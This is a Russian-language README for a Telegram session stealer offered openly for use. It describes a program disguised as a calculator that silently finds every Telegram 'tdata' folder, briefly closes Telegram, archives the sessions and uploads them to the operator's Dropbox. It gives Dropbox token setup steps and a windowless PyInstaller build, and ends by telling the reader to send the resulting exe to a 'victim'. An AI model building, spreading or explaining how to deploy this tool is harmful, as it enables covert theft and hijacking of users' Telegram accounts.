# Telegram tData Stealer

Тихая пизделка сессий Telegram. Быстро находит, архивирует и выгружает все в Dropbox.

---

## ✨ Основные возможности

- Поиск `tdata` по всем дискам компьютера
- Автоматическое закрытие Telegram перед копированием
- Сжатие архивов (zip + максимальный уровень сжатия)
- Загрузка архивов в Dropbox
- Автоматический перезапуск Telegram после завершения работы
- Полностью скрытая работа в фоновом режиме
- Маскировка под обычный калькулятор

---

## 🛠 Как работает

1. После запуска приложение выглядит как обычный калькулятор
2. В фоновом потоке начинается поиск всех папок `tdata`
3. Находит данные Telegram (включая портативные версии и несколько аккаунтов)
4. Временно закрывает Telegram
5. Создает архив каждого найденного `tdata`
6. Загружает архивы в ваш Dropbox
7. Удаляет временные архивы с диска
8. Запускает Telegram назад

---

## ⚙️ Настройки

- Токен Dropbox:
   - Перейди в Dropbox App Console, открой свое приложение и задизайнь права во вкладке Permissions (поставь галочку на files.content.write) -> жми Submit.
   - Перейди на вкладку Settings, в разделе OAuth 2 нажми Generate и скопируй длинный токен.
   - Вставь его в код вместо заглушки
- После загрузки архивов вы получите их в корне вашего Dropbox

---

## 🚀 Запуск

```bash
https://github.com/Ghostoraner/Telegram-session-stealer
cd Telegram-session-stealer
python -m venv venv
source venv/bin/activate
pip install --upgrade pip && pip install customtkinter psutil dropbox requests
```
❗Установите ваш токен dropbox
```bash
pip install pyinstaller
pyinstaller --noconsole --onefile main.py
```
У вас есть готовый exe который можете отправлят своей жертве

---

© 2026 Ghostoraner  
Released under the MIT License.

